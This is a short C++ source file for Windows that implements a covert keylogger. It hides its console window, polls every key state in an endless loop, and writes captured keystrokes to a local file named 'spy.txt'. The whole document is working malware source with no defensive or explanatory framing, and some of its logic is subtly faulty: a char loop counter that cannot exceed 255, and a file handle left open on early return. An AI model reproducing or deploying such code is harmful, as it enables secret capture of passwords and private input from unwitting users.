#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;


int Save(int key, const char* file)
{
	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	for (int i = 0; i < 20; i++)
	{
		if (i == key)
			return 0;
	}
	fprintf(OUTPUT_FILE, " %c ", key);
	fclose(OUTPUT_FILE);
	return 0;
}

int main()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
	char i;
	FILE* fd = fopen("spy.txt", "w");
	fclose(fd);
	while (1)
	{
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				cout << i << endl;
				Save(i, "spy.txt");
			}
		}
	}
	return 0;
}